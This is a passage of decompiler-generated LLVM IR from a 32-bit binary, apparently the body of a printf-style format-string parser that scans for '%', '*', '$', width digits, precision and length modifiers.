  %v3_e024 = load i32, i32* %v2_e024, align 4
  store i32 %v3_e024, i32* %r3.global-to-local, align 4
  %v9_e028 = icmp eq i32 %v4_e020, %v3_e024
  %v0_e02c = load i32, i32* %r0.global-to-local, align 4
  %v1_e02c = add i32 %v0_e02c, 1
  store i32 %v1_e02c, i32* %r0.global-to-local, align 4
  br i1 %v9_e028, label %dec_label_pc_e034, label %dec_label_pc_e44c

dec_label_pc_e034:                                ; preds = %dec_label_pc_e008
  %v2_e034 = icmp eq i8 %v3_e020, 0
  br i1 %v2_e034, label %dec_label_pc_e044, label %dec_label_pc_e03c

dec_label_pc_e03c:                                ; preds = %dec_label_pc_e034
  %tmp166 = icmp ult i32 %v1_e02c, 32
  br i1 %tmp166, label %dec_label_pc_e03c.dec_label_pc_e008_crit_edge, label %dec_label_pc_e044

dec_label_pc_e03c.dec_label_pc_e008_crit_edge:    ; preds = %dec_label_pc_e03c
  %v0_e008.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e008

dec_label_pc_e044:                                ; preds = %dec_label_pc_e03c, %dec_label_pc_e034
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e04c = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %bb, %dec_label_pc_e044
  %storemerge102 = phi i32 [ %v2_e04c, %dec_label_pc_e044 ], [ %v3_dfe8, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_e060

dec_label_pc_e05c:                                ; preds = %.thread22, %dec_label_pc_e16c
  %v0_e05c = phi i32 [ %v2_e1e4, %.thread22 ], [ %storemerge105, %dec_label_pc_e16c ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_e16c ]
  store i32 %v0_e05c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e060

dec_label_pc_e060:                                ; preds = %dec_label_pc_e050, %dec_label_pc_e05c
  %v1_e07c = phi i32 [ %storemerge102, %dec_label_pc_e050 ], [ %v0_e05c, %dec_label_pc_e05c ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_e050 ], [ %stack_var_-48.0, %dec_label_pc_e05c ]
  %v1_e060 = inttoptr i32 %v1_e07c to i8*
  %v2_e060 = load i8, i8* %v1_e060, align 1
  %v3_e060 = zext i8 %v2_e060 to i32
  store i32 %v3_e060, i32* %r3.global-to-local, align 4
  %v7_e064 = icmp eq i8 %v2_e060, 42
  br i1 %v7_e064, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_e060
  store i32 %v1_e07c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_e060
  %v1_e070 = load i32, i32* @lr, align 4
  %v4_e070 = mul i32 %v1_e070, -4
  %v5_e070 = add i32 %v4_e070, %v25_dfb8
  store i32 %v5_e070, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e07c = add i32 %v1_e07c, 1
  store i32 %v2_e07c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_e084 = add i32 %v5_e070, -12
  %v4_e084 = inttoptr i32 %v3_e084 to i32*
  store i32 0, i32* %v4_e084, align 4
  %v0_e0a8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_e0a8.pre = phi i32 [ %v0_e0a8.pre.pre, %bb124 ], [ %v1_e07c, %.thread9.thread ]
  %v2_e0ac.pre = load i32, i32* @global_var_1f4a0, align 4
  br label %.backedge

dec_label_pc_e08c:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_e090 = load i32, i32* %r0.global-to-local, align 4
  %v7_e094 = icmp sgt i32 %v0_e090, 4094
  br i1 %v7_e094, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_e08c
  %v1_e09c14 = add i32 %v0_e120, 1
  store i32 %v1_e09c14, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_e08c
  %v11_e098 = mul i32 %v0_e090, 10
  %v12_e098 = add i32 %v11_e098, %v3_e0a8
  store i32 %v12_e098, i32* %r3.global-to-local, align 4
  %v1_e09c = add i32 %v0_e120, 1
  store i32 %v1_e09c, i32* %r6.global-to-local, align 4
  %v9_e0a0 = add i32 %v12_e098, -48
  store i32 %v9_e0a0, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_e120 = phi i32 [ %v0_e0a8.pre, %.preheader ], [ %v1_e09c, %bb126 ], [ %v1_e09c14, %.thread12 ]
  store i32 128160, i32* %r3.global-to-local, align 4
  %v1_e0a8 = inttoptr i32 %v0_e120 to i8*
  %v2_e0a8 = load i8, i8* %v1_e0a8, align 1
  %v3_e0a8 = zext i8 %v2_e0a8 to i32
  store i32 %v3_e0a8, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac.pre, i32* %r3.global-to-local, align 4
  %v3_e0b0 = mul nuw nsw i32 %v3_e0a8, 2
  %v4_e0b0 = add i32 %v3_e0b0, %v2_e0ac.pre
  %v5_e0b0 = inttoptr i32 %v4_e0b0 to i8*
  %v6_e0b0 = load i8, i8* %v5_e0b0, align 1
  %v8_e0b0 = zext i8 %v6_e0b0 to i32
  store i32 %v8_e0b0, i32* %r3.global-to-local, align 4
  %v1_e0b4 = and i32 %v8_e0b0, 8
  %v2_e0b4 = icmp eq i32 %v1_e0b4, 0
  br i1 %v2_e0b4, label %dec_label_pc_e0bc, label %dec_label_pc_e08c

dec_label_pc_e0bc:                                ; preds = %.backedge
  %v0_e0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_e0bc = add i32 %v0_e0bc, -1
  %v2_e0bc = inttoptr i32 %v1_e0bc to i8*
  %v3_e0bc = load i8, i8* %v2_e0bc, align 1
  %v4_e0bc = zext i8 %v3_e0bc to i32
  store i32 %v4_e0bc, i32* %r3.global-to-local, align 4
  %v7_e0c0 = icmp eq i8 %v3_e0bc, 37
  br i1 %v7_e0c0, label %dec_label_pc_e0c8, label %dec_label_pc_e184

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e0bc
  %v7_e0c8 = icmp eq i8 %v2_e0a8, 36
  %. = zext i1 %v7_e0c8 to i32
  store i32 %., i32* @ip, align 4
  %v0_e0d4 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_e0d4, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_e0c8
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e0c8, %bb130
  %v1_e130 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_e0c8 ]
  %v2_e0dc = icmp eq i32 %v1_e130, 0
  %v0_e10c = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_e0dc, label %dec_label_pc_e10c, label %dec_label_pc_e0e4

dec_label_pc_e0e4:                                ; preds = %thread-pre-split
  %v2_e10c = icmp eq i32 %v0_e10c, 0
  %v1_e0e8 = add i32 %v0_e120, 1
  store i32 %v1_e0e8, i32* %r1.global-to-local, align 4
  br i1 %v2_e10c, label %dec_label_pc_e44c, label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0e4
  %v2_e0f0 = sub i32 %v0_e0d4, %v0_e10c
  %v4_e0f0 = xor i32 %v0_e10c, %v0_e0d4
  %v5_e0f0 = xor i32 %v2_e0f0, %v0_e0d4
  %v6_e0f0 = and i32 %v5_e0f0, %v4_e0f0
  %v7_e0f0 = icmp slt i32 %v6_e0f0, 0
  %v8_e0f0 = icmp slt i32 %v2_e0f0, 0
  %v9_e0f0 = icmp eq i32 %v0_e0d4, %v0_e10c
  %v3_e0f4 = xor i1 %v8_e0f0, %v7_e0f0
  %v4_e0f4 = or i1 %v9_e0f0, %v3_e0f4
  br i1 %v4_e0f4, label %dec_label_pc_e104, label %bb131

bb131:                                            ; preds = %dec_label_pc_e0f0
  store i32 %v0_e0d4, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e104

dec_label_pc_e100:                                ; preds = %dec_label_pc_e120, %dec_label_pc_e128
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e104

dec_label_pc_e104:                                ; preds = %bb131, %dec_label_pc_e0f0, %dec_label_pc_e100
  %v0_e104 = phi i32 [ %v0_e0bc, %dec_label_pc_e100 ], [ %v1_e0e8, %dec_label_pc_e0f0 ], [ %v1_e0e8, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e100 ], [ %v0_e0d4, %dec_label_pc_e0f0 ], [ %v0_e0d4, %bb131 ]
  br label %dec_label_pc_e13c

dec_label_pc_e10c:                                ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_e10c, 1
  br i1 %tmp132, label %dec_label_pc_e120, label %dec_label_pc_e114

dec_label_pc_e114:                                ; preds = %dec_label_pc_e10c
  %v7_e114 = icmp eq i8 %v2_e0a8, 109
  br i1 %v7_e114, label %dec_label_pc_e184, label %dec_label_pc_e44c

dec_label_pc_e120:                                ; preds = %dec_label_pc_e10c
  %tmp167 = icmp ugt i32 %v0_e120, %v0_e0bc
  br i1 %tmp167, label %dec_label_pc_e128, label %dec_label_pc_e100

dec_label_pc_e128:                                ; preds = %dec_label_pc_e120
  %v1_e128 = inttoptr i32 %v0_e0bc to i8*
  %v2_e128 = load i8, i8* %v1_e128, align 1
  %v3_e128 = zext i8 %v2_e128 to i32
  store i32 %v3_e128, i32* %r3.global-to-local, align 4
  %v7_e12c = icmp eq i8 %v2_e128, 48
  br i1 %v7_e12c, label %dec_label_pc_e100, label %bb133

bb133:                                            ; preds = %dec_label_pc_e128
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e184

dec_label_pc_e13c.loopexit:                       ; preds = %dec_label_pc_e144
  %v1_e150 = load i32, i32* @r4, align 4
  %v3_e150 = or i32 %v1_e150, %v0_e164
  store i32 %v3_e150, i32* @r4, align 4
  %v2_e154 = add i32 %storemerge105, 1
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e13c.loopexit, %dec_label_pc_e104
  %storemerge105 = phi i32 [ %v0_e104, %dec_label_pc_e104 ], [ %v2_e154, %dec_label_pc_e13c.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15db0.352 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e148 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_e144

dec_label_pc_e144:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e13c
  %v0_e164 = phi i32 [ %v2_e164, %dec_label_pc_e15c ], [ 1, %dec_label_pc_e13c ]
  %v0_e144 = phi i32 [ %v5_e144, %dec_label_pc_e15c ], [ ptrtoint ([8 x i8]* @global_var_15db0.352 to i32), %dec_label_pc_e13c ]
  %v1_e144 = inttoptr i32 %v0_e144 to i8*
  %v2_e144 = load i8, i8* %v1_e144, align 1
  %v3_e144 = zext i8 %v2_e144 to i32
  store i32 %v3_e144, i32* %r2.global-to-local, align 4
  %v5_e144 = add i32 %v0_e144, 1
  store i32 %v5_e144, i32* %r1.global-to-local, align 4
  %v2_e148 = load i8, i8* %v1_e148, align 1
  %v3_e148 = zext i8 %v2_e148 to i32
  store i32 %v3_e148, i32* %r3.global-to-local, align 4
  %v9_e14c = icmp eq i8 %v2_e148, %v2_e144
  br i1 %v9_e14c, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_e15c

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e144
  %v1_e15c = inttoptr i32 %v5_e144 to i8*
  %v2_e15c = load i8, i8* %v1_e15c, align 1
  %v3_e15c = zext i8 %v2_e15c to i32
  store i32 %v3_e15c, i32* %r3.global-to-local, align 4
  %v2_e160 = icmp eq i8 %v2_e15c, 0
  %v2_e164 = mul i32 %v0_e164, 2
  store i32 %v2_e164, i32* %r0.global-to-local, align 4
  br i1 %v2_e160, label %dec_label_pc_e16c, label %dec_label_pc_e144

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e15c
  %v1_e16c = add i32 %storemerge105, -1
  %v2_e16c = inttoptr i32 %v1_e16c to i8*
  %v3_e16c = load i8, i8* %v2_e16c, align 1
  %v7_e170 = icmp eq i8 %v3_e16c, 37
  %v0_e174 = load i32, i32* @r4, align 4
  %v1_e174 = and i32 %v0_e174, 10
  store i32 %v1_e174, i32* %r3.global-to-local, align 4
  %v4_e178 = udiv i32 %v1_e174, 2
  %v5_e178 = sub nuw nsw i32 -1, %v4_e178
  %v6_e178 = and i32 %v0_e174, %v5_e178
  store i32 %v6_e178, i32* @r4, align 4
  br i1 %v7_e170, label %dec_label_pc_e180, label %dec_label_pc_e05c

dec_label_pc_e180:                                ; preds = %dec_label_pc_e16c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %bb133, %dec_label_pc_e0bc, %dec_label_pc_e114, %dec_label_pc_e180
  %v1_e1c8 = phi i32 [ %storemerge105, %dec_label_pc_e180 ], [ %v0_e120, %bb133 ], [ %v0_e120, %dec_label_pc_e114 ], [ %v0_e120, %dec_label_pc_e0bc ]
  %v0_e1c4 = phi i32 [ %v5_e144, %dec_label_pc_e180 ], [ %v0_e0bc, %bb133 ], [ %v0_e0bc, %dec_label_pc_e114 ], [ %v0_e0bc, %dec_label_pc_e0bc ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_e180 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_e114 ], [ %stack_var_-48.1, %dec_label_pc_e0bc ]
  %v1_e184 = inttoptr i32 %v0_e1c4 to i8*
  %v2_e184 = load i8, i8* %v1_e184, align 1
  %v3_e184 = zext i8 %v2_e184 to i32
  store i32 %v3_e184, i32* %r3.global-to-local, align 4
  %v7_e188 = icmp eq i8 %v2_e184, 42
  br i1 %v7_e188, label %dec_label_pc_e190, label %dec_label_pc_e1d4

dec_label_pc_e190:                                ; preds = %dec_label_pc_e184
  %v0_e190 = load i32, i32* %sb.global-to-local, align 4
  %v2_e190 = icmp eq i32 %v0_e190, 0
  br i1 %v2_e190, label %dec_label_pc_e1c4, label %dec_label_pc_e198

dec_label_pc_e198:                                ; preds = %dec_label_pc_e190
  %v1_e198 = inttoptr i32 %v1_e1c8 to i8*
  %v2_e198 = load i8, i8* %v1_e198, align 1
  %v3_e198 = zext i8 %v2_e198 to i32
  store i32 %v3_e198, i32* %r3.global-to-local, align 4
  %v7_e19c = icmp eq i8 %v2_e198, 36
  br i1 %v7_e19c, label %dec_label_pc_e1a4, label %dec_label_pc_e44c

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e198
  %v0_e1a4 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_e1a4, 1
  br i1 %tmp134, label %dec_label_pc_e44c, label %dec_label_pc_e1ac

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e1a4
  store i32 %v25_dfb8, i32* %r1.global-to-local, align 4
  %v0_e1b4 = load i32, i32* @lr, align 4
  %v3_e1b4 = mul i32 %v0_e1b4, -4
  %v4_e1b4 = add i32 %v3_e1b4, %v25_dfb8
  store i32 %v4_e1b4, i32* %r3.global-to-local, align 4
  %v1_e1b8 = add i32 %v1_e1c8, 1
  store i32 %v1_e1b8, i32* %r6.global-to-local, align 4
  %v2_e1bc = add i32 %v4_e1b4, -24
  %v3_e1bc = inttoptr i32 %v2_e1bc to i32*
  store i32 %v0_e1a4, i32* %v3_e1bc, align 4
  br label %dec_label_pc_e1d0

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e190
  %v1_e1c4 = add i32 %v0_e1c4, 1
  store i32 %v1_e1c4, i32* %r3.global-to-local, align 4
  %v9_e1c8 = icmp eq i32 %v1_e1c4, %v1_e1c8
  br i1 %v9_e1c8, label %dec_label_pc_e1d0, label %dec_label_pc_e44c

dec_label_pc_e1d0:                                ; preds = %dec_label_pc_e1c4, %dec_label_pc_e1ac
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e1d4

dec_label_pc_e1d4:                                ; preds = %dec_label_pc_e184, %dec_label_pc_e1d0
  %v0_e1d4 = load i32, i32* @lr, align 4
  %v2_e1d4 = icmp eq i32 %v0_e1d4, 0
  br i1 %v2_e1d4, label %dec_label_pc_e1dc, label %dec_label_pc_dff4

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e1d4
  %v0_e1dc = load i32, i32* %r6.global-to-local, align 4
  %v1_e1dc = inttoptr i32 %v0_e1dc to i8*
  %v2_e1dc = load i8, i8* %v1_e1dc, align 1
  %v3_e1dc = zext i8 %v2_e1dc to i32
  store i32 %v3_e1dc, i32* %r3.global-to-local, align 4
  %v7_e1e0 = icmp eq i8 %v2_e1dc, 46
  br i1 %v7_e1e0, label %.thread22, label %dec_label_pc_e1f4

.thread22:                                        ; preds = %dec_label_pc_e1dc
  %v2_e1e4 = add i32 %v0_e1dc, 1
  store i32 %v2_e1e4, i32* %r6.global-to-local, align 4
  %v1_e1e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_e1e8, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_e05c

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1dc
  %v0_e1f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e1f4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e1fc

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_dff4, %dec_label_pc_e1f4
  %v0_e204.pre = phi i32 [ %v0_e1dc, %dec_label_pc_e1f4 ], [ %v0_e204.pre.pre, %dec_label_pc_dff4 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_e1f4 ], [ %v0_dff4, %dec_label_pc_dff4 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15d58.354 to i32), i32* %r1.global-to-local, align 4
  %v1_e204 = inttoptr i32 %v0_e204.pre to i8*
  br label %dec_label_pc_e200

dec_label_pc_e200:                                ; preds = %dec_label_pc_e210, %dec_label_pc_e1fc
  %v0_e210 = phi i32 [ %v1_e210, %dec_label_pc_e210 ], [ ptrtoint ([9 x i8]* @global_var_15d58.354 to i32), %dec_label_pc_e1fc ]
  %v1_e200 = inttoptr i32 %v0_e210 to i8*
  %v2_e200 = load i8, i8* %v1_e200, align 1
  %v3_e200 = zext i8 %v2_e200 to i32
  store i32 %v3_e200, i32* %r2.global-to-local, align 4
  %v2_e204 = load i8, i8* %v1_e204, align 1
  %v3_e204 = zext i8 %v2_e204 to i32
  store i32 %v3_e204, i32* %r3.global-to-local, align 4
  %v9_e208 = icmp eq i8 %v2_e204, %v2_e200
  br i1 %v9_e208, label %dec_label_pc_dffc, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e200
  %v1_e210 = add i32 %v0_e210, 1
  %v2_e210 = inttoptr i32 %v1_e210 to i8*
  %v3_e210 = load i8, i8* %v2_e210, align 1
  %v4_e210 = zext i8 %v3_e210 to i32
  store i32 %v4_e210, i32* %r3.global-to-local, align 4
  store i32 %v1_e210, i32* %r1.global-to-local, align 4
  %v2_e214 = icmp eq i8 %v3_e210, 0
  br i1 %v2_e214, label %dec_label_pc_e21c, label %dec_label_pc_e200

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e210, %dec_label_pc_dffc
  %v1_e23c = phi i32 [ %v1_dffc, %dec_label_pc_dffc ], [ %v0_e204.pre, %dec_label_pc_e210 ]
  %v1_e238 = phi i32 [ %v0_e210, %dec_label_pc_dffc ], [ %v1_e210, %dec_label_pc_e210 ]
  %v2_e220 = sub i32 %v1_e238, ptrtoint ([9 x i8]* @global_var_15d58.354 to i32)
  store i32 %v2_e220, i32* %r3.global-to-local, align 4
  %v8_e228 = icmp sgt i32 %v2_e220, 1
  br i1 %v8_e228, label %.thread25, label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e21c
  %v1_e22c = inttoptr i32 %v1_e23c to i8*
  %v2_e22c = load i8, i8* %v1_e22c, align 1
  %v3_e22c = zext i8 %v2_e22c to i32
  store i32 %v3_e22c, i32* %r2.global-to-local, align 4
  %v1_e230 = inttoptr i32 %v1_e238 to i8*
  %v2_e230 = load i8, i8* %v1_e230, align 1
  %v3_e230 = zext i8 %v2_e230 to i32
  store i32 %v3_e230, i32* %r3.global-to-local, align 4
  %v9_e234 = icmp eq i8 %v2_e22c, %v2_e230
  br i1 %v9_e234, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_e22c
  %v2_e238 = add i32 %v1_e238, 9
  store i32 %v2_e238, i32* %r1.global-to-local, align 4
  %v2_e23c = add i32 %v1_e23c, 1
  store i32 %v2_e23c, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e22c, %dec_label_pc_e21c, %bb135
  %v0_e244 = phi i32 [ %v1_e238, %dec_label_pc_e22c ], [ %v1_e238, %dec_label_pc_e21c ], [ %v2_e238, %bb135 ]
  %v0_e240 = phi i32 [ %v1_e23c, %dec_label_pc_e22c ], [ %v1_e23c, %dec_label_pc_e21c ], [ %v2_e23c, %bb135 ]
  %v1_e240 = inttoptr i32 %v0_e240 to i8*
  %v2_e240 = load i8, i8* %v1_e240, align 1
  %v3_e240 = zext i8 %v2_e240 to i32
  store i32 %v3_e240, i32* %r2.global-to-local, align 4
  %v1_e244 = add i32 %v0_e244, 9
  %v2_e244 = inttoptr i32 %v1_e244 to i8*
  %v3_e244 = load i8, i8* %v2_e244, align 1
  %v4_e244 = zext i8 %v3_e244 to i32
  store i32 %v4_e244, i32* %r3.global-to-local, align 4
  %v2_e248 = icmp eq i8 %v2_e240, 0
  %v3_e24c = mul nuw nsw i32 %v4_e244, 256
  store i32 %v3_e24c, i32* @lr, align 4
  br i1 %v2_e248, label %dec_label_pc_e44c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %.thread25
  %v3_e258 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_e258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e2e0, %dec_label_pc_e254
  %v1_e26c = phi i32 [ %v1_e2e0, %dec_label_pc_e2e0 ], [ ptrtoint ([21 x i8]* @global_var_15d98.356 to i32), %dec_label_pc_e254 ]
  %v1_e25c = inttoptr i32 %v1_e26c to i8*
  %v2_e25c = load i8, i8* %v1_e25c, align 1
  %v3_e25c = zext i8 %v2_e25c to i32
  store i32 %v3_e25c, i32* %r3.global-to-local, align 4
  %v9_e260 = icmp eq i8 %v2_e25c, %v2_e240
  br i1 %v9_e260, label %dec_label_pc_e268, label %dec_label_pc_e2e0

dec_label_pc_e268:                                ; preds = %dec_label_pc_e25c
  store i32 ptrtoint ([21 x i8]* @global_var_15d98.356 to i32), i32* %r3.global-to-local, align 4
  %v2_e26c = sub i32 %v1_e26c, ptrtoint ([21 x i8]* @global_var_15d98.356 to i32)
  store i32 %v2_e26c, i32* %r2.global-to-local, align 4
  %v7_e274 = icmp slt i32 %v2_e26c, 18
  br i1 %v7_e274, label %bb137, label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %dec_label_pc_e268
  %v1_e278 = and i32 %v3_e24c, 1024
  %v2_e278 = icmp eq i32 %v1_e278, 0
  br i1 %v2_e278, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_e278
  %v2_e27c = add i32 %v2_e26c, -2
  store i32 %v2_e27c, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_e268, %dec_label_pc_e278, %bb136
  %v0_e280 = phi i32 [ %v2_e26c, %dec_label_pc_e268 ], [ %v2_e26c, %dec_label_pc_e278 ], [ %v2_e27c, %bb136 ]
  %v1_e280 = load i32, i32* %r7.global-to-local, align 4
  %v2_e280 = add i32 %v1_e280, 32
  %v3_e280 = inttoptr i32 %v2_e280 to i32*
  store i32 %v0_e280, i32* %v3_e280, align 4
  store i32 ptrtoint (i32* @global_var_15d8b.358 to i32), i32* %r1.global-to-local, align 4
  %v0_e28c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e288

dec_label_pc_e288:                                ; preds = %dec_label_pc_e288, %bb137
  %v0_e288 = phi i32 [ %v1_e288, %dec_label_pc_e288 ], [ ptrtoint (i32* @global_var_15d8b.358 to i32), %bb137 ]
  %v1_e288 = add i32 %v0_e288, 1
  %v2_e288 = inttoptr i32 %v1_e288 to i8*
  %v3_e288 = load i8, i8* %v2_e288, align 1
  %v4_e288 = zext i8 %v3_e288 to i32
  store i32 %v4_e288, i32* %r3.global-to-local, align 4
  store i32 %v1_e288, i32* %r1.global-to-local, align 4
  %v8_e290 = icmp sgt i32 %v0_e28c.pre, %v4_e288
  br i1 %v8_e290, label %dec_label_pc_e288, label %dec_label_pc_e294

dec_label_pc_e294:                                ; preds = %dec_label_pc_e288
  store i32 ptrtoint (i32* @global_var_15d7c.362 to i32), i32* %r0.global-to-local, align 4
  %v2_e29c = sub i32 %v1_e288, ptrtoint (i32* @global_var_15d8c.360 to i32)
  %v2_e2a0 = mul i32 %v2_e29c, 2
  store i32 %v2_e2a0, i32* %r3.global-to-local, align 4
  %v2_e2a8 = add i32 %v2_e2a0, ptrtoint (i32* @global_var_15d7c.362 to i32)
  store i32 %v2_e2a8, i32* %r2.global-to-local, align 4
  %v1_e2ac = add i32 %v2_e2a0, add (i32 ptrtoint (i32* @global_var_15d7c.362 to i32), i32 1)
  %v2_e2ac = inttoptr i32 %v1_e2ac to i8*
  %v3_e2ac = load i8, i8* %v2_e2ac, align 1
  %v4_e2ac = zext i8 %v3_e2ac to i32
  store i32 %v4_e2ac, i32* %r1.global-to-local, align 4
  %v2_e2b0 = add i32 %v2_e2a0, ptrtoint (i32* @global_var_15d6c.364 to i32)
  store i32 %v2_e2b0, i32* %r2.global-to-local, align 4
  %v3_e2b4 = inttoptr i32 %v2_e2a8 to i8*
  %v4_e2b4 = load i8, i8* %v3_e2b4, align 2
  %v6_e2b4 = zext i8 %v4_e2b4 to i32
  store i32 %v6_e2b4, i32* %r0.global-to-local, align 4
  %v1_e2b8 = add i32 %v2_e2a0, add (i32 ptrtoint (i32* @global_var_15d6c.364 to i32), i32 1)
  %v2_e2b8 = inttoptr i32 %v1_e2b8 to i8*
  %v3_e2b8 = load i8, i8* %v2_e2b8, align 1
  %v4_e2b8 = zext i8 %v3_e2b8 to i32
  store i32 %v4_e2b8, i32* %r2.global-to-local, align 4
  %v3_e2bc = inttoptr i32 %v2_e2b0 to i8*
  %v4_e2bc = load i8, i8* %v3_e2bc, align 2
  %v6_e2bc = zext i8 %v4_e2bc to i32
  %v3_e2c0 = mul nuw i32 %v4_e2ac, 16777216
  store i32 %v3_e2c0, i32* %r1.global-to-local, align 4
  %v4_e2c4 = sdiv i32 %v3_e2c0, 65536
  %v5_e2c4 = or i32 %v6_e2b4, %v4_e2c4
  %v3_e2c8 = mul nuw i32 %v4_e2b8, 16777216
  store i32 %v3_e2c8, i32* %r2.global-to-local, align 4
  %v4_e2cc = sdiv i32 %v3_e2c8, 65536
  %v5_e2cc = or i32 %v6_e2bc, %v4_e2cc
  store i32 %v5_e2cc, i32* %r3.global-to-local, align 4
  %v0_e2d0 = load i32, i32* @lr, align 4
  %v2_e2d0 = or i32 %v5_e2c4, %v0_e2d0
  store i32 ptrtoint ([21 x i8]* @global_var_15d98.356 to i32), i32* @ip, align 4
  %v2_e2d8 = and i32 %v2_e2d0, %v5_e2cc
  store i32 %v2_e2d8, i32* %r0.global-to-local, align 4
  %v0_e2f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e2ec

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e25c
  %v1_e2e0 = add i32 %v1_e26c, 1
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i8*
  %v3_e2e0 = load i8, i8* %v2_e2e0, align 1
  %v4_e2e0 = zext i8 %v3_e2e0 to i32
  store i32 %v4_e2e0, i32* %r3.global-to-local, align 4
  store i32 %v1_e2e0, i32* @ip, align 4
  %v2_e2e4 = icmp eq i8 %v3_e2e0, 0
  br i1 %v2_e2e4, label %dec_label_pc_e2ec, label %dec_label_pc_e25c

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2e0, %dec_label_pc_e294
  %v0_e2f8 = phi i32 [ %v0_e2d0, %dec_label_pc_e294 ], [ %v3_e24c, %dec_label_pc_e2e0 ]
  %v0_e2f4 = phi i32 [ %v0_e2f4.pre, %dec_label_pc_e294 ], [ %v0_e240, %dec_label_pc_e2e0 ]
  %v0_e2ec = phi i32 [ %v2_e2d8, %dec_label_pc_e294 ], [ %v3_e258, %dec_label_pc_e2e0 ]
  store i32 %v0_e2ec, i32* %stack_var_-36, align 4
  %v0_e2f0 = load i32, i32* @r4, align 4
  %v1_e2f0 = and i32 %v0_e2f0, 4
  %v1_e2f4 = inttoptr i32 %v0_e2f4 to i8*
  %v2_e2f4 = load i8, i8* %v1_e2f4, align 1
  %v3_e2f4 = zext i8 %v2_e2f4 to i32
